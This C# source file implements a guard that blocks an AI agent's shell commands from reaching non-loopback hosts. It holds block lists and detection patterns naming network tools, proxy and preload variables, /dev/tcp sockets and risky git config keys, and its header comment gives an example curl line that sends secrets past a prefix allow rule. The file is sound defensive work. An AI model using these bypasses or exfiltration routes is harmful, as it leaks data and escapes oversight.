// Network egress (docs/adr/0019, threat model R-12). The runner's allow list has no general network tool, but an allow
// rule is a prefix match — `Bash(curl * http://localhost*)` also matches `curl -F f=@secrets http://localhost https://x` —
// and a skill grant or a member's own settings could pre-approve more. So the PreToolUse guard refuses, whatever approved
// the call, every Bash / PowerShell command that would send data to another computer:
//   - curl, wget, Invoke-WebRequest / iwr / Invoke-RestMethod / irm: every address must be loopback (localhost,
//     *.localhost, 127.0.0.0/8, [::1]) — Agentic Testing curls the local app; a proxy, --resolve / --connect-to, a
//     config file (-K, wget -e / -i) or a computed address is refused;
//   - nc / ncat / netcat, ping / traceroute / Test-Connection: loopback only; rsync to a remote (host:path, rsync://,
//     -e); /dev/tcp and /dev/udp redirections;
//   - tools whose only job is reaching another computer: ssh, scp, sftp, ftp, telnet, socat, DNS lookups (nslookup, dig,
//     host, Resolve-DnsName — DNS carries data too), mail, BITS, PowerShell remoting, HTTPie / aria2c;
//   - python -m http.server and the other network modules; PowerShell's .NET network types ([Net.WebClient],
//     [System.Net.Http.HttpClient], sockets …) and Add-Type with code;
//   - environment that redirects a tool's traffic or runs a command for it (HTTPS_PROXY, GIT_SSH_COMMAND, CURL_HOME …),
//     and `git -c` keys that do the same (core.sshCommand, http.proxy, url.*.insteadOf, alias.*);
//   - publishing: npm / pnpm / yarn publish (and login, token …), dotnet nuget push, gh gist / api / release upload /
//     extension / ssh-key.
// The run's own tooling keeps working: git clone / fetch / pull / push to a named remote, a configured remote's host, a
// known forge (GitHub, GitLab, Bitbucket, Azure DevOps) or a host the member lists in REMOTE_AGENT_GIT_HOSTS; gh;
// dotnet / npm / pnpm / yarn restore; npx playwright. Code the repository runs (an npm script, a test, a committed
// helper) is not a shell command — that is an OS sandbox's job (ADR-0018).

using System.Net;
using System.Text.RegularExpressions;

namespace AgentOs.RemoteAgent;

internal static partial class ScopedWriteGuard
{
    /// <summary>Hosts (comma / semicolon / space separated) git may reach besides the known forges and the repository's
    /// own remotes — a self-hosted git server. Set on the runner's computer by its owner.</summary>
    internal const string GitHostsVariable = "REMOTE_AGENT_GIT_HOSTS";

    /// <summary>Ends every network refusal (so <see cref="Run"/> doesn't add the run-folder sentence).</summary>
    internal const string NetworkNote = " A run may reach only this computer over the network (localhost / 127.0.0.1); "
        + "git, gh and the package managers reach their own servers.";

    private static readonly HashSet<string> WebTools = new(StringComparer.OrdinalIgnoreCase)
    {
        "curl", "wget", "invoke-webrequest", "iwr", "invoke-restmethod", "irm",
    };

    private static readonly HashSet<string> SocketTools = new(StringComparer.OrdinalIgnoreCase) { "nc", "ncat", "netcat" };

    private static readonly HashSet<string> PingTools = new(StringComparer.OrdinalIgnoreCase)
    {
        "ping", "ping6", "traceroute", "tracert", "tracepath", "pathping", "test-connection", "test-netconnection", "tnc",
    };

    // Tools whose only job is reaching another computer.
    private static readonly HashSet<string> RemoteTools = new(StringComparer.OrdinalIgnoreCase)
    {
        "ssh", "scp", "sftp", "ftp", "tftp", "lftp", "ncftp", "telnet", "socat", "smbclient", "nslookup", "dig", "host",
        "whois", "resolve-dnsname", "send-mailmessage", "mail", "mailx", "sendmail", "start-bitstransfer", "bitsadmin",
        "invoke-command", "icm", "enter-pssession", "etsn", "new-pssession", "nsn", "http", "https", "xh", "aria2c",
    };

    // Environment that changes where a tool connects or what it runs to connect.
    private static readonly HashSet<string> NetworkVariables = new(StringComparer.OrdinalIgnoreCase)
    {
        "http_proxy", "https_proxy", "all_proxy", "ftp_proxy", "socks_proxy", "socks5_proxy", "GIT_SSH", "GIT_SSH_COMMAND",
        "GIT_PROXY_COMMAND", "GIT_ASKPASS", "SSH_ASKPASS", "GIT_CONFIG_PARAMETERS", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
        "GIT_CONFIG_COUNT", "GIT_EXEC_PATH", "CURL_HOME", "WGETRC", "RSYNC_RSH", "RSYNC_CONNECT_PROG", "LD_PRELOAD",
        "DYLD_INSERT_LIBRARIES", "BASH_ENV", "npm_config_registry", "NPM_CONFIG_REGISTRY",
    };

    private static readonly string[] KnownForges = ["github.com", "gitlab.com", "bitbucket.org", "dev.azure.com", "ssh.dev.azure.com"];

    /// <summary>Why <paramref name="program"/> with <paramref name="args"/> would reach another computer, or null.</summary>
    private static string? CheckEgress(string program, List<ShellWords.Word> args, IReadOnlyList<ShellWords.Word> assignments,
        string? cwd, GuardContext ctx, bool powerShell)
    {
        if (assignments.FirstOrDefault(a => IsNetworkVariable(a.Text)) is { } variable)
        {
            return $"setting {variable.Text[..variable.Text.IndexOf('=', StringComparison.Ordinal)]} changes where a tool connects "
                + "or what it runs to connect." + NetworkNote;
        }
        if (program is "export" or "declare" or "typeset" or "readonly" or "local"
            && args.FirstOrDefault(a => IsNetworkVariable(a.Text)) is { } exported)
        {
            return $"setting {exported.Text[..exported.Text.IndexOf('=', StringComparison.Ordinal)]} changes where a tool connects "
                + "or what it runs to connect." + NetworkNote;
        }
        if (WebTools.Contains(program))
        {
            return program is "curl" ? CheckCurl(args) : program is "wget" ? CheckWget(args) : CheckWebCmdlet(program, args);
        }
        if (SocketTools.Contains(program)) { return CheckSocketTool(program, args); }
        if (PingTools.Contains(program)) { return CheckHostsOnly(program, args); }
        if (RemoteTools.Contains(program)) { return $"'{program}' reaches another computer." + NetworkNote; }
        return program switch
        {
            "rsync" => CheckRsync(args),
            "certutil" when args.Exists(a => a.Text.TrimStart('-', '/').StartsWith("urlcache", StringComparison.OrdinalIgnoreCase)
                || a.Text.Contains("://", StringComparison.Ordinal)) => "'certutil -urlcache' downloads from another computer." + NetworkNote,
            "add-type" when powerShell && !args.TrueForAll(a => IsAddTypeAssemblyOnly(a.Text)) =>
                "Add-Type compiles code at run time, which can't be checked — load an assembly with -AssemblyName only." + NetworkNote,
            "git" when cwd is not null => CheckGitNetwork(args, cwd, ctx),
            "gh" => CheckGhNetwork(args, cwd, ctx),
            "npm" or "pnpm" or "yarn" => CheckPublish(program, args),
            "dotnet" when Positionals(args, NoValueOptions) is [{ Text: "nuget" }, { Text: "push" or "delete" }, ..] =>
                "'dotnet nuget push' publishes a package to another computer." + NetworkNote,
            _ when Interpreters.Contains(program) && NetworkModule(args) is { } module =>
                $"'{program} -m {module}' serves or sends data over the network." + NetworkNote,
            _ => null,
        };
    }

    /// <summary>Whether <paramref name="program"/> sends data over the network — xargs / find -exec can't hand it checked
    /// arguments.</summary>
    private static bool IsNetworkTool(string program) =>
        WebTools.Contains(program) || SocketTools.Contains(program) || RemoteTools.Contains(program) || program is "rsync";

    private static bool IsNetworkVariable(string assignment)
    {
        var eq = assignment.IndexOf('=', StringComparison.Ordinal);
        if (eq <= 0) { return false; }
        var name = assignment[..eq];
        return NetworkVariables.Contains(name)
            || name.StartsWith("GIT_CONFIG_KEY_", StringComparison.OrdinalIgnoreCase)
            || name.StartsWith("GIT_CONFIG_VALUE_", StringComparison.OrdinalIgnoreCase);
    }

    private static bool IsAddTypeAssemblyOnly(string arg) =>
        !arg.StartsWith('-') || (arg.Length >= 3 && "-assemblyname".StartsWith(arg.ToLowerInvariant(), StringComparison.Ordinal));

    // ── addresses ─────────────────────────────────────────────────────────────────────────────────────────────────

    /// <summary>Whether <paramref name="host"/> is this computer: localhost, *.localhost, 127.0.0.0/8, ::1.</summary>
    internal static bool IsLoopbackHost(string host)
    {
        ArgumentNullException.ThrowIfNull(host);
        var h = host.Trim().TrimEnd('.');
        if (h.StartsWith('[') && h.EndsWith(']')) { h = h[1..^1]; }
        if (h.Length == 0) { return false; }
        if (h.Equals("localhost", StringComparison.OrdinalIgnoreCase) || h.EndsWith(".localhost", StringComparison.OrdinalIgnoreCase))
        {
            return h.All(c => char.IsAsciiLetterOrDigit(c) || c is '-' or '.');
        }
        return IPAddress.TryParse(h, out var ip) && IPAddress.IsLoopback(ip);
    }

    /// <summary>The host an address names (<c>https://user@host:port/path</c>, <c>host:port/path</c>, <c>[::1]:80</c>), or
    /// null when it can't be told unambiguously (two <c>@</c>, a backslash or an odd character in the authority).</summary>
    internal static string? UrlHost(string address)
    {
        ArgumentNullException.ThrowIfNull(address);
        var s = address.Trim();
        var scheme = s.IndexOf("://", StringComparison.Ordinal);
        if (scheme >= 0) { s = s[(scheme + 3)..]; }
        var end = s.IndexOfAny(['/', '?', '#']);
        var authority = end < 0 ? s : s[..end];
        // Parsers disagree on a backslash (WHATWG: a '/') and on more than one '@' — refuse rather than guess.
        if (authority.Contains('\\', StringComparison.Ordinal) || authority.Count(c => c == '@') > 1) { return null; }
        var at = authority.LastIndexOf('@');
        if (at >= 0) { authority = authority[(at + 1)..]; }
        string host;
        if (authority.StartsWith('['))
        {
            var close = authority.IndexOf(']', StringComparison.Ordinal);
            if (close < 0) { return null; }
            host = authority[..(close + 1)];
        }
        else
        {
            var colon = authority.IndexOf(':', StringComparison.Ordinal);
            host = colon >= 0 ? authority[..colon] : authority;
        }
        return host.Length > 0 && host.All(c => char.IsAsciiLetterOrDigit(c) || c is '-' or '.' or '_' or '[' or ']' or ':' or '$' or '{' or '}')
            ? host
            : null;
    }

    // Null when the address is this computer; otherwise why it is refused.
    private static string? RemoteAddress(string program, ShellWords.Word address)
    {
        var host = UrlHost(address.Text);
        if (host is null) { return $"'{program}' gets an address that can't be read unambiguously ('{address.Text}')." + NetworkNote; }
        if (host.IndexOfAny(['$', '{', '}', '`']) >= 0 || (address.Dynamic && address.Text.TrimStart().StartsWith('$')))
        {
            return $"'{program}' gets a computed address ('{address.Text}'), so where it connects can't be checked." + NetworkNote;
        }
        return IsLoopbackHost(host) ? null : $"'{program}' would send data to '{host}', another computer." + NetworkNote;
    }

    // ── curl / wget / the web cmdlets ────────────────────────────────────────────────────────────────────────────

    private const string CurlShortValues = "AbcCdDeEFHmoPQrtTuUwXyYz";
    private const string CurlShortRefused = "Kx";

    private static readonly HashSet<string> CurlLongValues = new(StringComparer.Ordinal)
    {
        "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii", "--json", "--form", "--form-string",
        "--header", "--proxy-header", "--request", "--user", "--user-agent", "--referer", "--cookie", "--cookie-jar",
        "--output", "--output-dir", "--dump-header", "--max-time", "--connect-timeout", "--retry", "--retry-delay",
        "--retry-max-time", "--write-out", "--upload-file", "--cert", "--cert-type", "--key", "--key-type", "--cacert",
        "--capath", "--interface", "--range", "--continue-at", "--limit-rate", "--max-filesize", "--expect100-timeout",
        "--keepalive-time", "--oauth2-bearer", "--unix-socket", "--abstract-unix-socket", "--trace", "--trace-ascii",
        "--stderr", "--variable", "--time-cond", "--local-port", "--max-redirs", "--speed-limit", "--speed-time",
        "--etag-save", "--etag-compare", "--hsts", "--alt-svc", "--libcurl", "--url-query", "--aws-sigv4", "--ciphers",
        "--tls-max", "--pinnedpubkey", "--happy-eyeballs-timeout-ms", "--parallel-max", "--rate",
        "--create-file-mode", "--trace-config", "--ip-tos", "--vlan-priority",
    };

    private static readonly HashSet<string> CurlLongRefused = new(StringComparer.Ordinal)
    {
        "--proxy", "--preproxy", "--socks4", "--socks4a", "--socks5", "--socks5-hostname", "--proxy1.0", "--resolve",
        "--connect-to", "--config", "--doh-url", "--dns-servers", "--dns-interface", "--dns-ipv4-addr", "--dns-ipv6-addr",
    };

    private static string? CheckCurl(List<ShellWords.Word> args) =>
        CheckAddresses("curl", args, CurlShortValues, CurlShortRefused, CurlLongValues, CurlLongRefused, "--url");

    private const string WgetShortValues = "OoaPtTwQlARDIXUBY";
    private const string WgetShortRefused = "ei";

    private static readonly HashSet<string> WgetLongValues = new(StringComparer.Ordinal)
    {
        "--output-document", "--output-file", "--append-output", "--directory-prefix", "--tries", "--timeout", "--wait",
        "--quota", "--level", "--accept", "--reject", "--domains", "--exclude-domains", "--include-directories",
        "--exclude-directories", "--user-agent", "--base", "--header", "--post-data", "--post-file", "--body-data",
        "--body-file", "--method", "--user", "--password", "--http-user", "--http-password", "--referer", "--load-cookies",
        "--save-cookies", "--ca-certificate", "--certificate", "--private-key", "--limit-rate", "--waitretry",
        "--dns-timeout", "--connect-timeout", "--read-timeout", "--bind-address", "--proxy-user", "--proxy-password",
        "--restrict-file-names", "--default-page", "--max-redirect", "--progress", "--retry-on-http-error",
    };

    private static readonly HashSet<string> WgetLongRefused = new(StringComparer.Ordinal) { "--execute", "--input-file", "--config", "--use-askpass" };

    private static string? CheckWget(List<ShellWords.Word> args) =>
        CheckAddresses("wget", args, WgetShortValues, WgetShortRefused, WgetLongValues, WgetLongRefused, urlOption: null);

    // Options, their values and the addresses of a curl-like command line: every word that isn't an option or an option's
    // value is an address (an unknown option's value, too: fail closed).
    private static string? CheckAddresses(string program, List<ShellWords.Word> args, string shortValues, string shortRefused,
        HashSet<string> longValues, HashSet<string> longRefused, string? urlOption)
    {
        var endOfOptions = false;
        for (var i = 0; i < args.Count; i++)
        {
            var word = args[i];
            var text = word.Text;
            if (!endOfOptions && text == "--") { endOfOptions = true; continue; }
            if (endOfOptions || !text.StartsWith('-') || text == "-")
            {
                if (RemoteAddress(program, word) is { } remote) { return remote; }
                continue;
            }
            if (text.StartsWith("--", StringComparison.Ordinal))
            {
                var eq = text.IndexOf('=', StringComparison.Ordinal);
                var name = eq > 0 ? text[..eq] : text;
                if (longRefused.Contains(name))
                {
                    return $"'{program} {name}' changes where it connects (or reads its options from a file), which can't be checked." + NetworkNote;
                }
                if (name == urlOption)
                {
                    var value = eq > 0 ? word with { Text = text[(eq + 1)..] } : i + 1 < args.Count ? args[++i] : null;
                    if (value is not null && RemoteAddress(program, value) is { } remote) { return remote; }
                    continue;
                }
                if (eq < 0 && longValues.Contains(name)) { i++; }
                continue;
            }
            for (var k = 1; k < text.Length; k++)
            {
                if (shortRefused.Contains(text[k], StringComparison.Ordinal))
                {
                    return $"'{program} -{text[k]}' changes where it connects (or reads its options from a file), which can't be checked." + NetworkNote;
                }
                if (!shortValues.Contains(text[k], StringComparison.Ordinal)) { continue; }
                if (k == text.Length - 1) { i++; } // the value is the next word; attached otherwise
                break;
            }
        }
        return null;
    }

    private static readonly HashSet<string> WebCmdletValues = new(StringComparer.OrdinalIgnoreCase)
    {
        "-method", "-custommethod", "-body", "-headers", "-contenttype", "-outfile", "-infile", "-form", "-credential",
        "-useragent", "-timeoutsec", "-sessionvariable", "-sv", "-websession", "-maximumredirection", "-authentication",
        "-token", "-transferencoding", "-retryintervalsec", "-maximumretrycount", "-certificate", "-certificatethumbprint",
        "-httpversion", "-sslprotocol", "-operationtimeoutseconds", "-connectiontimeoutseconds", "-responseheaderstvariable",
        "-statuscodevariable", "-followrellink", "-maximumfollowrellink", "-responseheadersvariable",
    };

    private static string? CheckWebCmdlet(string program, List<ShellWords.Word> args)
    {
        var addresses = 0;
        for (var i = 0; i < args.Count; i++)
        {
            var word = args[i];
            var text = word.Text;
            if (!text.StartsWith('-') || text.Length < 2)
            {
                addresses++;
                if (RemoteAddress(program, word) is { } remote) { return remote; }
                continue;
            }
            var colon = text.IndexOf(':', StringComparison.Ordinal);
            var name = (colon > 0 ? text[..colon] : text).ToLowerInvariant();
            ShellWords.Word? Value() => colon > 0 ? word with { Text = text[(colon + 1)..] } : i + 1 < args.Count ? args[++i] : null;
            if (name.Length >= 3 && "-uri".StartsWith(name, StringComparison.Ordinal))
            {
                addresses++;
                if (Value() is { } uri && RemoteAddress(program, uri) is { } remote) { return remote; }
                continue;
            }
            if (name.StartsWith("-proxy", StringComparison.Ordinal) && name is not ("-proxyusedefaultcredentials" or "-proxycredential"))
            {
                return $"'{program} -Proxy' sends the request through another computer." + NetworkNote;
            }
            if (WebCmdletValues.Contains(name) || name is "-proxycredential") { _ = Value(); }
        }
        // PowerShell splits "-Body (Get-Content x) -Uri …" at the parentheses: no address seen = can't be checked.
        return addresses == 0 ? $"'{program}' gets no address the runner can see (a parenthesised value splits the command)." + NetworkNote : null;
    }

    // ── sockets, ping, rsync ─────────────────────────────────────────────────────────────────────────────────────

    private static string? CheckSocketTool(string program, List<ShellWords.Word> args)
    {
        foreach (var a in args.Where(a => a.Text.StartsWith('-')))
        {
            var name = a.Text.StartsWith("--", StringComparison.Ordinal) ? a.Text.Split('=')[0] : null;
            if (name is "--exec" or "--sh-exec" or "--lua-exec" or "--proxy" or "--proxy-type"
                || (name is null && a.Text.AsSpan(1).IndexOfAny("ecxX") >= 0))
            {
                return $"'{program} {a.Text}' runs a command or connects through another computer." + NetworkNote;
            }
        }
        return CheckHostsOnly(program, args);
    }

    // Every word that isn't an option or a number (a port, a count, a timeout) must be this computer.
    private static string? CheckHostsOnly(string program, List<ShellWords.Word> args)
    {
        foreach (var a in args.Where(a => !a.Text.StartsWith('-') && !PortOrNumber().IsMatch(a.Text)))
        {
            if (RemoteAddress(program, a) is { } remote) { return remote; }
        }
        return null;
    }

    private static string? CheckRsync(List<ShellWords.Word> args)
    {
        foreach (var text in args.Select(a => a.Text))
        {
            if (text is "-e" or "--rsh" || text.StartsWith("--rsh=", StringComparison.Ordinal) || text.StartsWith("--rsync-path", StringComparison.Ordinal)
                || (text.StartsWith('-') && !text.StartsWith("--", StringComparison.Ordinal) && text.Contains('e', StringComparison.Ordinal)))
            {
                return $"'rsync {text}' runs its own remote shell." + NetworkNote;
            }
            if (text.StartsWith('-')) { continue; }
            if (RemoteHostOf(text) is { } host && !IsLoopbackHost(host))
            {
                return $"'rsync' would send data to '{host}', another computer." + NetworkNote;
            }
        }
        return null;
    }

    // The host of an scp-like "[user@]host:path" / "host::module" / "scheme://host/…" — null for a local path (a Windows
    // drive "C:\x" included).
    private static string? RemoteHostOf(string text)
    {
        if (text.Contains("://", StringComparison.Ordinal)) { return UrlHost(text) ?? text; }
        var colon = text.IndexOf(':', StringComparison.Ordinal);
        if (colon <= 0) { return null; }
        var slash = text.IndexOfAny(['/', '\\']);
        if (slash >= 0 && slash < colon) { return null; }
        if (colon == 1 && char.IsAsciiLetter(text[0])) { return null; } // C:\x, C:/x
        var host = text[..colon];
        var at = host.LastIndexOf('@');
        return at >= 0 ? host[(at + 1)..] : host;
    }

    // ── git / gh / publishing ────────────────────────────────────────────────────────────────────────────────────

    private static readonly HashSet<string> GitNetworkValueOptions = new(StringComparer.Ordinal)
    {
        "--depth", "--deepen", "--shallow-since", "--shallow-exclude", "-j", "--jobs", "--refmap", "--negotiation-tip",
        "--filter", "-o", "--server-option", "--push-option", "--strategy", "-s", "-X", "--strategy-option", "-b", "--branch",
        "--origin", "--reference", "--reference-if-able", "-c", "--config", "--separate-git-dir", "--template", "--bundle-uri",
        "--ref-format", "--name",
    };

    private static string? CheckGitNetwork(List<ShellWords.Word> args, string cwd, GuardContext ctx)
    {
        var i = 0;
        while (i < args.Count && args[i].Text.StartsWith('-'))
        {
            var text = args[i].Text;
            string? config = text is "-c" ? (i + 1 < args.Count ? args[++i].Text : null)
                : text.StartsWith("-c", StringComparison.Ordinal) && text.Length > 2 ? text[2..]
                : text.StartsWith("--config-env=", StringComparison.Ordinal) ? text["--config-env=".Length..]
                : text is "--config-env" ? (i + 1 < args.Count ? args[++i].Text : null)
                : null;
            if (config is not null && RiskyGitConfig().IsMatch(config.Split('=')[0]))
            {
                return $"'git -c {config.Split('=')[0]}' changes where git connects or runs a command of its own." + NetworkNote;
            }
            if (text is "-C" or "--git-dir" or "--work-tree" or "--namespace" or "--exec-path") { i++; }
            i++;
        }
        if (i >= args.Count) { return null; }
        var sub = args[i].Text;
        var rest = args.Skip(i + 1).ToList();
        if (sub == "send-email") { return "'git send-email' sends mail to another computer." + NetworkNote; }
        if (rest.Exists(a => a.Text.StartsWith("--upload-pack", StringComparison.Ordinal) || a.Text.StartsWith("--receive-pack", StringComparison.Ordinal)
            || a.Text.StartsWith("--exec", StringComparison.Ordinal) || (sub == "clone" && a.Text == "-u")))
        {
            return $"'git {sub}' with a command of its own to run on the other side can't be checked." + NetworkNote;
        }
        var repos = new List<ShellWords.Word>();
        switch (sub)
        {
            case "clone" or "fetch" or "pull" or "push" or "ls-remote":
                repos.AddRange(Positionals(rest, GitNetworkValueOptions).Take(1));
                repos.AddRange(OptionValues(rest, ["--repo"]));
                break;
            case "archive":
                repos.AddRange(OptionValues(rest, ["--remote"]));
                break;
            case "submodule" when rest.Count > 0 && rest[0].Text == "add":
                repos.AddRange(Positionals(rest.Skip(1), GitNetworkValueOptions).Take(1));
                break;
            case "remote" when rest.Count > 0 && rest[0].Text is "add" or "set-url":
                repos.AddRange(Positionals(rest.Skip(1), GitNetworkValueOptions).Skip(1).Take(1));
                break;
            default:
                return null;
        }
        foreach (var repo in repos)
        {
            if (GitRepositoryProblem(sub, repo, cwd, ctx) is { } problem) { return problem; }
        }
        return null;
    }

    private static string? GitRepositoryProblem(string sub, ShellWords.Word repo, string cwd, GuardContext ctx)
    {
        var text = repo.Text;
        if (GitTransportHelper().IsMatch(text))
        {
            return $"'git {sub} {text}' uses a transport that runs a command of its own." + NetworkNote;
        }
        var host = RemoteHostOf(text);
        var computed = text.IndexOfAny(['$', '`']) >= 0;
        if (computed && (host is null || host.IndexOfAny(['$', '`', '{', '}']) >= 0))
        {
            return $"'git {sub}' gets a computed repository ('{text}'), so where it connects can't be checked." + NetworkNote;
        }
        if (host is null) { return null; } // a named remote (origin) or a local path
        if (!host.All(c => char.IsAsciiLetterOrDigit(c) || c is '-' or '.' or '_' or '[' or ']' or ':'))
        {
            return $"'git {sub}' gets a repository address that can't be read unambiguously ('{text}')." + NetworkNote;
        }
        return IsLoopbackHost(host) || IsGitHost(host, cwd, ctx)
            ? null
            : $"'git {sub}' would reach '{host}', which is not a git host of this run (its remotes, a known forge, or "
              + $"{GitHostsVariable})." + NetworkNote;
    }

    private static bool IsGitHost(string host, string cwd, GuardContext ctx)
    {
        var h = host.TrimEnd('.');
        if (Array.Exists(KnownForges, f => f.Equals(h, StringComparison.OrdinalIgnoreCase))
            || h.EndsWith(".visualstudio.com", StringComparison.OrdinalIgnoreCase))
        {
            return true;
        }
        return ctx.ExtraGitHosts.Contains(h, StringComparer.OrdinalIgnoreCase)
            || ctx.GitRemoteHostsOf(cwd).Contains(h, StringComparer.OrdinalIgnoreCase);
    }

    private static readonly string[] GitRemoteUrlArgs = ["config", "--get-regexp", @"^remote\..*\.(url|pushurl)$"];

    /// <summary>The hosts of the remotes configured in the repository at <paramref name="cwd"/> (<c>git config
    /// --get-regexp</c>); empty when there is none or git can't tell.</summary>
    internal static IReadOnlyCollection<string> GitRemoteHosts(string cwd)
    {
        var psi = new System.Diagnostics.ProcessStartInfo("git")
        {
            WorkingDirectory = FromGitBash(cwd), RedirectStandardOutput = true, RedirectStandardError = true,
            UseShellExecute = false, CreateNoWindow = true,
        };
        foreach (var a in GitRemoteUrlArgs) { psi.ArgumentList.Add(a); }
        try
        {
            if (!Directory.Exists(psi.WorkingDirectory)) { return []; }
            using var git = System.Diagnostics.Process.Start(psi);
            if (git is null) { return []; }
            var stderr = git.StandardError.ReadToEndAsync();
            var output = git.StandardOutput.ReadToEnd();
            if (!git.WaitForExit(10_000)) { git.Kill(); return []; }
            _ = stderr.Result;
            return [.. output.Split('\n', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
                .Select(line => line.Split(' ', 2) is [_, var url] ? RemoteHostOf(url.Trim()) : null)
                .OfType<string>()];
        }
        catch (Exception ex) when (ex is System.ComponentModel.Win32Exception or InvalidOperationException or IOException)
        {
            _ = ex;
            return [];
        }
    }

    /// <summary>The hosts a <see cref="GitHostsVariable"/> value lists.</summary>
    internal static IReadOnlyList<string> ParseHosts(string? setting) =>
        string.IsNullOrWhiteSpace(setting)
            ? []
            : setting.Split([',', ';', ' '], StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);

    private static readonly HashSet<string> GhRefused = new(StringComparer.Ordinal)
    {
        "gist", "api", "ssh-key", "gpg-key", "extension", "ext", "codespace", "cs", "secret", "variable", "auth", "attestation",
    };

    private static string? CheckGhNetwork(List<ShellWords.Word> args, string? cwd, GuardContext ctx)
    {
        var positional = Positionals(args, NoValueOptions);
        if (positional.Count == 0) { return null; }
        var first = positional[0].Text;
        if (GhRefused.Contains(first)) { return $"'gh {first}' sends data or runs code outside the run's pull request." + NetworkNote; }
        if (first == "release" && positional.Count > 1 && positional[1].Text is "create" or "upload" or "edit")
        {
            return $"'gh release {positional[1].Text}' publishes files." + NetworkNote;
        }
        if (first == "repo" && positional.Count > 2 && positional[1].Text == "clone" && cwd is not null)
        {
            return GitRepositoryProblem("clone", positional[2], cwd, ctx);
        }
        return null;
    }

    private static readonly HashSet<string> PublishCommands = new(StringComparer.Ordinal)
    {
        "publish", "unpublish", "adduser", "add-user", "login", "logout", "token", "owner", "access", "deprecate", "dist-tag",
    };

    private static string? CheckPublish(string program, List<ShellWords.Word> args)
    {
        var positional = Positionals(args, PmValueOptions);
        var first = positional.FirstOrDefault()?.Text;
        if (program == "yarn" && first == "npm") { first = positional.Skip(1).FirstOrDefault()?.Text; }
        return first is not null && PublishCommands.Contains(first)
            ? $"'{program} {first}' publishes to (or signs in to) a package registry." + NetworkNote
            : null;
    }

    private static string? NetworkModule(List<ShellWords.Word> args)
    {
        var at = args.FindIndex(a => a.Text == "-m");
        if (at < 0 || at + 1 >= args.Count) { return null; }
        var module = args[at + 1].Text;
        return NetworkModuleName().IsMatch(module) ? module : null;
    }

    // PowerShell code that opens a connection through .NET, or writes a variable that redirects a tool's traffic.
    private static string? PowerShellNetworkCode(string command)
    {
        if (DotNetNetworkApi().IsMatch(command))
        {
            return "direct .NET network calls ([Net.WebClient], [System.Net.Http.HttpClient], sockets …) can't be checked." + NetworkNote;
        }
        foreach (Match m in PowerShellEnvWrite().Matches(command))
        {
            if (NetworkVariables.Contains(m.Groups["name"].Value) || m.Groups["name"].Value.StartsWith("GIT_CONFIG_", StringComparison.OrdinalIgnoreCase))
            {
                return $"setting {m.Groups["name"].Value} changes where a tool connects or what it runs to connect." + NetworkNote;
            }
        }
        return null;
    }

    // /dev/tcp/<host>/<port> and /dev/udp/… (bash opens a socket for a redirection there).
    private static string? DevSocketProblem(ShellWords.Simple simple)
    {
        foreach (var target in simple.Redirects.Concat(simple.Inputs))
        {
            var t = target.Text;
            if (!t.StartsWith("/dev/tcp/", StringComparison.Ordinal) && !t.StartsWith("/dev/udp/", StringComparison.Ordinal)) { continue; }
            var host = t[9..].Split('/')[0];
            if (target.Dynamic || !IsLoopbackHost(host)) { return $"the redirection to '{t}' opens a connection to another computer." + NetworkNote; }
        }
        return null;
    }

    [GeneratedRegex(@"^\d+(?:[-:]\d+)?$", RegexOptions.CultureInvariant)]
    private static partial Regex PortOrNumber();

    [GeneratedRegex(@"^[A-Za-z][A-Za-z0-9+.-]*::", RegexOptions.CultureInvariant)]
    private static partial Regex GitTransportHelper();

    // git -c keys that redirect a connection or run a command (core.sshCommand, http.proxy, url.*.insteadOf, alias.* …).
    [GeneratedRegex(@"^(?:alias\.|url\.|core\.(?:sshcommand|gitproxy|hookspath|fsmonitor|pager|editor|askpass)|credential|https?\.(?:.*\.)?proxy|remote\..*\.(?:url|pushurl|proxy|uploadpack|receivepack)|filter\.|diff\.external|diff\..*\.(?:textconv|command)|uploadpack\.|receivepack\.|protocol\.|sequence\.editor|gpg\.(?:.*\.)?program|ssh\.|include\.|includeif\.)",
        RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex RiskyGitConfig();

    [GeneratedRegex(@"^(?:http(?:\..*)?|urllib(?:\..*)?|smtpd|smtplib|ftplib|telnetlib|socketserver|xmlrpc(?:\..*)?|aiosmtpd|webbrowser|socket)$", RegexOptions.CultureInvariant)]
    private static partial Regex NetworkModuleName();

    [GeneratedRegex(@"(?:\[\s*(?:System\.)?(?:Net\.)?(?:Http\.)?(?:HttpClient|WebClient|TcpClient|UdpClient|TcpListener|WebRequest|HttpWebRequest|FtpWebRequest|Sockets\.\w+|Mail\.\w+|NetworkInformation\.\w+|Dns|ServicePointManager)\s*\])|(?:New-Object\s+(?:-TypeName\s+)?[""']?(?:System\.)?(?:Net\.)?(?:Http\.)?(?:HttpClient|WebClient|TcpClient|UdpClient|TcpListener|Sockets\.\w+|Mail\.\w+))",
        RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex DotNetNetworkApi();

    [GeneratedRegex(@"(?:\$env:(?<name>\w+)\s*=(?!=))|(?:(?:Set-Item|si|New-Item|ni)\s+(?:-Path\s+)?[""']?env:(?<name>\w+))|(?:SetEnvironmentVariable\(\s*[""'](?<name>\w+))",
        RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex PowerShellEnvWrite();
}
